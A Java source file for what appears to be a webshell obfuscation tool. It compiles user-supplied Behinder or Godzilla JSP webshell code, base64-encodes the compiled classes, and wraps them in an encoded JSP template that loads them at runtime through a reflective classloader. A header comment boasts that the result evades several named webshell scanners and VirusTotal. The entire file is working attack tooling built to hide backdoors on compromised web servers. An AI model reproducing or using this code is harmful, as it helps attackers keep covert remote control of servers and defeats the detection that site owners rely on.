package encode;

import application.RandomString;
import org.apache.jasper.JspC;
import org.apache.tomcat.JarScanFilter;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo1 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demo1txt;

    public JspEncodeDemo1() {
    }

    public JspEncodeDemo1(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }
    public String[] Run() throws Exception {



        if(!sourcecode.isEmpty()){
            try {

                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                String filename = this.key+".jsp";
                File file1 = new File("./cache/");
                file1.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File file2 = new File("./cache/org/apache/jsp/");
                File[] list = file2.listFiles();
                String jspsource = "";
                for (File f : list) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        String[] split = f.getName().split("\\.");
                        String demo1 = "U3RyaW5nICRjbGFzc25hbWUkID0gIiRjbGFzc2Jhc2U2NCQiO21hcC5wdXQoIiRjbGFzc25hbWUkIiwgJGNsYXNzbmFtZSQpOw==";
                        String base64class = new String(Base64.getDecoder().decode(demo1));
                        base64class = base64class.replace("$classname$",split[0]);
                        base64class = base64class.replace("$classbase64$",s);
                        jspsource +=base64class;
                    }
                }

                String demo1 = "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuTWFwIiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuamFzcGVyLnNlcnZsZXQuSnNwU2VydmxldCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJvcmcuYXBhY2hlLmphc3Blci5ydW50aW1lLkh0dHBKc3BCYXNlIiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5TdGFuZGFyZFdyYXBwZXJGYWNhZGUiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLlN0YW5kYXJkV3JhcHBlciIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC5GaWVsZCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLklPRXhjZXB0aW9uIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEudXRpbC5IYXNoTWFwIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC5BY2Nlc3NpYmxlT2JqZWN0IiAlPgo8JUAgcGFnZSBpbXBvcnQ9InN1bi5taXNjLkNoYXJhY3RlckRlY29kZXIiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby5QdXNoYmFja0lucHV0U3RyZWFtIiAlPgo8JUAgcGFnZSBpbXBvcnQ9InN1bi5taXNjLkNFRm9ybWF0RXhjZXB0aW9uIiAlPgo8JUAgcGFnZSBpbXBvcnQ9InN1bi5taXNjLkNFU3RyZWFtRXhoYXVzdGVkIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uT3V0cHV0U3RyZWFtIiAlPgoKPCUhCiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIEQgZXh0ZW5kcyBDaGFyYWN0ZXJEZWNvZGVyIHsKICAgICAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBjaGFyW10gcGVtX2FycmF5ID0gbmV3IGNoYXJbXXsnQScsICdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJywgJ2EnLCAnYicsICdjJywgJ2QnLCAnZScsICdmJywgJ2cnLCAnaCcsICdpJywgJ2onLCAnaycsICdsJywgJ20nLCAnbicsICdvJywgJ3AnLCAncScsICdyJywgJ3MnLCAndCcsICd1JywgJ3YnLCAndycsICd4JywgJ3knLCAneicsICcwJywgJzEnLCAnMicsICczJywgJzQnLCAnNScsICc2JywgJzcnLCAnOCcsICc5JywgJysnLCAnLyd9OwogICAgICAgIHByaXZhdGUgc3RhdGljIGZpbmFsIGJ5dGVbXSBwZW1fY29udmVydF9hcnJheSA9IG5ldyBieXRlWzI1Nl07CiAgICAgICAgYnl0ZVtdIGRlY29kZV9idWZmZXIgPSBuZXcgYnl0ZVs0XTsKICAgICAgICBwdWJsaWMgRCgpIHt9CiAgICAgICAgcHJvdGVjdGVkIGludCBieXRlc1BlckF0b20oKSB7CiAgICAgICAgICAgIHJldHVybiA0OwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgaW50IGJ5dGVzUGVyTGluZSgpIHsKICAgICAgICAgICAgcmV0dXJuIDcyOwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgdm9pZCBkZWNvZGVBdG9tKFB1c2hiYWNrSW5wdXRTdHJlYW0gdmFyMSwgT3V0cHV0U3RyZWFtIHZhcjIsIGludCB2YXIzKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgICAgICBieXRlIHZhcjUgPSAtMTsKICAgICAgICAgICAgYnl0ZSB2YXI2ID0gLTE7CiAgICAgICAgICAgIGJ5dGUgdmFyNyA9IC0xOwogICAgICAgICAgICBieXRlIHZhcjggPSAtMTsKICAgICAgICAgICAgaWYgKHZhcjMgPCAyKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgQ0VGb3JtYXRFeGNlcHRpb24oIkJBU0U2NERlY29kZXI6IE5vdCBlbm91Z2ggYnl0ZXMgZm9yIGFuIGF0b20uIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpbnQgdmFyNDsKICAgICAgICAgICAgICAgIGRvIHt2YXI0ID0gdmFyMS5yZWFkKCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHZhcjQgPT0gLTEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFU3RyZWFtRXhoYXVzdGVkKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSB3aGlsZSh2YXI0ID09IDEwIHx8IHZhcjQgPT0gMTMpOwogICAgICAgICAgICAgICAgdGhpcy5kZWNvZGVfYnVmZmVyWzBdID0gKGJ5dGUpdmFyNDsKICAgICAgICAgICAgICAgIHZhcjQgPSB0aGlzLnJlYWRGdWxseSh2YXIxLCB0aGlzLmRlY29kZV9idWZmZXIsIDEsIHZhcjMgLSAxKTsKICAgICAgICAgICAgICAgIGlmICh2YXI0ID09IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFU3RyZWFtRXhoYXVzdGVkKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmICh2YXIzID4gMyAmJiB0aGlzLmRlY29kZV9idWZmZXJbM10gPT0gNjEpIHt2YXIzID0gMzt9CiAgICAgICAgICAgICAgICAgICAgaWYgKHZhcjMgPiAyICYmIHRoaXMuZGVjb2RlX2J1ZmZlclsyXSA9PSA2MSkge3ZhcjMgPSAyO30KICAgICAgICAgICAgICAgICAgICBzd2l0Y2godmFyMykgewogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXI4ID0gcGVtX2NvbnZlcnRfYXJyYXlbdGhpcy5kZWNvZGVfYnVmZmVyWzNdICYgMjU1XTsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyNyA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclsyXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjYgPSBwZW1fY29udmVydF9hcnJheVt0aGlzLmRlY29kZV9idWZmZXJbMV0gJiAyNTVdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyNSA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclswXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2godmFyMykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNSA8PCAyICYgMjUyIHwgdmFyNiA+Pj4gNCAmIDMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI1IDw8IDIgJiAyNTIgfCB2YXI2ID4+PiA0ICYgMykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI2IDw8IDQgJiAyNDAgfCB2YXI3ID4+PiAyICYgMTUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI1IDw8IDIgJiAyNTIgfCB2YXI2ID4+PiA0ICYgMykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI2IDw8IDQgJiAyNDAgfCB2YXI3ID4+PiAyICYgMTUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNyA8PCA2ICYgMTkyIHwgdmFyOCAmIDYzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN0YXRpYyB7CiAgICAgICAgICAgIGludCB2YXIwOwogICAgICAgICAgICBmb3IodmFyMCA9IDA7IHZhcjAgPCAyNTU7ICsrdmFyMCkge3BlbV9jb252ZXJ0X2FycmF5W3ZhcjBdID0gLTE7fQogICAgICAgICAgICBmb3IodmFyMCA9IDA7IHZhcjAgPCBwZW1fYXJyYXkubGVuZ3RoOyArK3ZhcjApIHtwZW1fY29udmVydF9hcnJheVtwZW1fYXJyYXlbdmFyMF1dID0gKGJ5dGUpdmFyMDt9CiAgICAgICAgfQogICAgfQolPgoKPCUhCiAgICBwdWJsaWMgY2xhc3MgSnNwQ2xhc3NMb2FkZXIgZXh0ZW5kcyBDbGFzc0xvYWRlciB7CgogICAgICAgIHB1YmxpYyBKc3BDbGFzc0xvYWRlcihDbGFzc0xvYWRlciBwYXJlbnQpIHsKICAgICAgICAgICAgc3VwZXIocGFyZW50KTsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBDbGFzczw/PiBmaW5kQ2xhc3MoU3RyaW5nIG5hbWUpIHsKCiAgICAgICAgICAgIE1hcDxTdHJpbmcsIFN0cmluZz4gbWFwID0gbmV3IEhhc2hNYXA8PigpOwoKICAgICAgICAgICAgJGJhc2U2NGNvZGUkCiAgICAgICAgICAgIAogICAgICAgICAgICBTdHJpbmdbXSBzcGxpdCA9IG5hbWUuc3BsaXQoIlxcLiIpOwogICAgICAgICAgICBieXRlW10gY2xhc3NCeXRlcyA9IG51bGw7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjbGFzc0J5dGVzID0gbmV3IEQoKS5kZWNvZGVCdWZmZXIobWFwLmdldChzcGxpdFtzcGxpdC5sZW5ndGggLSAxXSkpOwogICAgICAgICAgICB9IGNhdGNoIChJT0V4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIE1ldGhvZCBkZW1vY2xhc3MgPSBudWxsOwogICAgICAgICAgICBDbGFzczw/PiBhQ2xhc3MgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZGVtb2NsYXNzID0gQ2xhc3NMb2FkZXIuY2xhc3MuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgU3RyaW5nLmNsYXNzLCBieXRlW10uY2xhc3MsIGludC5jbGFzcywgaW50LmNsYXNzKTsKICAgICAgICAgICAgICAgIE1ldGhvZCBzZXRBY2Nlc3NpYmxlID0gQWNjZXNzaWJsZU9iamVjdC5jbGFzcy5nZXRNZXRob2QoInNldEFjY2Vzc2libGUiLCBib29sZWFuLmNsYXNzKTsKICAgICAgICAgICAgICAgIHNldEFjY2Vzc2libGUuaW52b2tlKGRlbW9jbGFzcyx0cnVlKTsKICAgICAgICAgICAgICAgIGFDbGFzcyA9IChDbGFzczw/PilkZW1vY2xhc3MuLyphKi8KICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlKHRoaXMsIG5hbWUsIGNsYXNzQnl0ZXMsIDAsIGNsYXNzQnl0ZXMubGVuZ3RoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGFDbGFzczsKICAgICAgICB9CiAgICB9CiU+Cgo8JQogICAgSnNwU2VydmxldCBqc3BTZXJ2bGV0ID0gbmV3IEpzcFNlcnZsZXQoKTsKICAgIEpzcENsYXNzTG9hZGVyIGpzcENsYXNzTG9hZGVyID0gbmV3IEpzcENsYXNzTG9hZGVyKGpzcFNlcnZsZXQuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKTsKICAgIEh0dHBKc3BCYXNlIGh0dHBKc3BCYXNlID0gKEh0dHBKc3BCYXNlKSBqc3BDbGFzc0xvYWRlci5maW5kQ2xhc3MoIm9yZy5hcGFjaGUuanNwLiRrZXkkX2pzcCIpLi8qYSovCiAgICAgICAgICAgIG5ld0luc3RhbmNlKCk7CiAgICBTdGFuZGFyZFdyYXBwZXJGYWNhZGUgc3RhbmRhcmRXcmFwcGVyRmFjYWRlID0gbmV3IFN0YW5kYXJkV3JhcHBlckZhY2FkZShuZXcgU3RhbmRhcmRXcmFwcGVyKCkpOwogICAgRmllbGQgY29uZmlnMSA9IHN0YW5kYXJkV3JhcHBlckZhY2FkZS5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQoImNvbmZpZyIpOwogICAgY29uZmlnMS5zZXRBY2Nlc3NpYmxlKHRydWUpOwogICAgY29uZmlnMS5zZXQoc3RhbmRhcmRXcmFwcGVyRmFjYWRlLCBwYWdlQ29udGV4dC5nZXRTZXJ2bGV0Q29uZmlnKCkpOwogICAgRmllbGQgY29udGV4dCA9IHN0YW5kYXJkV3JhcHBlckZhY2FkZS5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQoImNvbnRleHQiKTsKICAgIGNvbnRleHQuc2V0QWNjZXNzaWJsZSh0cnVlKTsKICAgIGNvbnRleHQuc2V0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSwgcGFnZUNvbnRleHQuZ2V0U2VydmxldENvbnRleHQoKSk7CiAgICBodHRwSnNwQmFzZS5pbml0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSk7CiAgICBodHRwSnNwQmFzZS5zZXJ2aWNlKHJlcXVlc3QsIHJlc3BvbnNlKTsKJT4=";
                encode = new String(Base64.getDecoder().decode(demo1));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",jspsource);

                demo1txt = "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-10-16_jspdemo1\n" +
                        " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
                        " */";
                deleteDir("./cache/");
                return new String[]{this.encode,this.demo1txt};
            }catch (Exception e){
                return new String[]{"加密失败",this.demo1txt};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",this.demo1txt};
        }

    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
